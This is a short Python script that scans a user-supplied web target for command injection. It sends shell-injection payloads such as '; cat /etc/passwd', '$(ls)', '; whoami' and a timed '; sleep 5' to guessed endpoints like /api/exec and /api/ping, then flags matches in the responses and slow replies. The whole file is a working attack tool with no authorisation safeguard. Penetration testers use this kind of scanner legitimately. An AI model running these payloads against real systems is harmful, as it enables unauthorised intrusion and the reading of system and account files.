#!/usr/bin/env python3
"""
test_cmdi.py - Command Injection Testing Script
Usage: python test_cmdi.py <target_url>
"""

import sys
import requests
from urllib.parse import urljoin

CMDI_PAYLOADS = [
    "; ls", "| ls", "& ls", "&& ls", "|| ls",
    "`ls`", "$(ls)", "; cat /etc/passwd", "; whoami", "; sleep 5"
]

INDICATORS = ["root:", "bin:", "daemon:", "uid=", "gid=", "total ", "drwx", "-rw-"]

def test_cmdi(base_url):
    print(f"=== Command Injection Test ===")
    print(f"Target: {base_url}\n")
    
    vulnerable = []
    test_endpoints = ["/api/exec?cmd={}", "/api/run?command={}", "/api/ping?host={}"]
    
    for endpoint in test_endpoints:
        for payload in CMDI_PAYLOADS:
            url = urljoin(base_url, endpoint.format(payload))
            try:
                resp = requests.get(url, timeout=10)
                
                if any(ind in resp.text for ind in INDICATORS):
                    print(f"[!] Command injection found: {endpoint}")
                    print(f"    Payload: {payload}")
                    vulnerable.append((endpoint, payload))
                    break
                    
                if "sleep" in payload and resp.elapsed.total_seconds() > 4:
                    print(f"[!] Time-based command injection: {endpoint}")
                    vulnerable.append((endpoint, payload))
                    
            except requests.exceptions.Timeout:
                if "sleep" in payload:
                    print(f"[!] Timeout (command injection likely): {endpoint}")
                    vulnerable.append((endpoint, payload))
            except requests.exceptions.RequestException:
                pass
    
    print(f"\n=== Results ===")
    if vulnerable:
        print(f"[CRITICAL] Found {len(vulnerable)} command injection vulnerabilities!")
    else:
        print("[OK] No command injection vulnerabilities detected.")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print(f"Usage: {sys.argv[0]} <target_url>")
        sys.exit(1)
    test_cmdi(sys.argv[1])
